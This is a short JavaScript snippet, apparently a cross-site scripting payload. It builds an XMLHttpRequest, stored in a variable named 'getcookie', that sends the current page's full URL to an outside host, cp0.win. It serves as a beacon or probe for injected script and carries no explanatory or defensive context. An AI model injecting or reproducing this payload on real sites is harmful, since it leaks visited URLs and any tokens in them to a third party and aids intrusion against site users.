var getcookie = new XMLHttpRequest();
var url = "http://cp0.win/?test&"+window.location.href;
getcookie.open("GET",url,true);
getcookie.send();
